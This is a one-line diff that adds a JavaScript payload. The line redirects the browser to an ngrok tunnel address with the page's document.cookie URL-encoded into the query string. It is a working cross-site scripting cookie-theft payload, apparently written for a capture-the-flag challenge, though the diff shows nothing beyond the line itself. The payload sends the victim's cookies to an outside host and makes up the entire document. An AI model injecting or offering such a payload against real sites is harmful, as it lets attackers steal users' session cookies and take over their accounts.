@@ -1,0 +1,1 @@
+window.location.href = 'http://66e9-201-17-126-102.ngrok.io/flag?'+encodeURIComponent(document.cookie);
